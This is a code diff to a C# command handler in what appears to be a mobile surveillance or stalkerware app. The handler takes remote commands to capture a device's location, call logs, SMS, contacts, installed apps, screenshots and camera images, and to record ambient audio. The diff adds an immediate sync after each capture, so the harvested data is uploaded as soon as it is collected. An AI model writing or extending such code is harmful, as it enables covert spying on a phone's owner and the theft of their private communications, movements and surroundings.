@@ -35,26 +35,32 @@ public sealed class CommandExecutor
 
                 case CommandTypes.CaptureLocation:
                     await _bgService.CollectAndStoreAllAsync(CancellationToken.None);
+                    await _bgService.SyncAllPendingAsync();
                     break;
 
                 case CommandTypes.CaptureCallLogs:
                     await _bgService.CollectCallLogsAsync();
+                    await _bgService.SyncAllPendingAsync();
                     break;
 
                 case CommandTypes.CaptureSms:
                     await _bgService.CollectSmsAsync();
+                    await _bgService.SyncAllPendingAsync();
                     break;
 
                 case CommandTypes.CaptureContacts:
                     await _bgService.CollectContactsAsync();
+                    await _bgService.SyncAllPendingAsync();
                     break;
 
                 case CommandTypes.CaptureApps:
                     await _bgService.CollectInstalledAppsAsync(CancellationToken.None);
+                    await _bgService.SyncAllPendingAsync();
                     break;
 
                 case CommandTypes.CaptureScreenshot:
                     await _bgService.CaptureScreenshotAsync();
+                    await _bgService.SyncAllPendingAsync();
                     break;
 
                 case CommandTypes.CaptureCamera:
@@ -62,6 +68,7 @@ public sealed class CommandExecutor
                         ? args["camera"]?.ToString() ?? "rear"
                         : "rear";
                     await _bgService.CaptureCameraAsync(camera);
+                    await _bgService.SyncAllPendingAsync();
                     break;
 
                 case CommandTypes.RecordAmbient:
@@ -69,6 +76,7 @@ public sealed class CommandExecutor
                         ? Convert.ToInt32(args["duration"])
                         : 30;
                     await _bgService.StartAmbientRecordingAsync(duration);
+                    await _bgService.SyncAllPendingAsync();
                     break;
 
                 case CommandTypes.LockDevice:
